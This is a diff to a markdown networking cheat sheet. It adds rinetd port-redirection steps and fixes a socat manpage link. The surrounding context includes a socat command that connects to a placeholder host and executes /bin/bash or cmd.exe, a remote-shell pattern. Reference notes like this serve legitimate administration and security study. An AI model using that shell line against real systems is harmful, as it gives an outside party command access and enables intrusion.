@@ -47,7 +47,15 @@
   * -p is the source port
   * -n prevents DNS lookups on addresses, hostnames, and ports
 
-# [socat](https://127.0.0.1):
+# [rinetd](https://manpages.debian.org/unstable/rinetd/rinetd.8.en.html)
+#### `nano /etc/rinetd.conf`
+#### `X.X.X.X YYY A.A.A.A BBB (in the conf file)`
+#### `service rinetd restart`
+  * Redirects traffic received on YYY from X.X.X.X to A.A.A.A:BBB
+    * X.X.X.X can be 0.0.0.0 to redirect traffic from any source
+  * Restart the service after changing the configuration file to apply changes
+
+# [socat](https://linux.die.net/man/1/socat):
 #### `socat - TCP4:X.X.X.X:YYY`
 #### `socat TCP4-listen:YYY STDOUT`
 #### `socat TCP4:X.X.X.X:YYY EXEC:(/bin/bash or cmd.exe)`
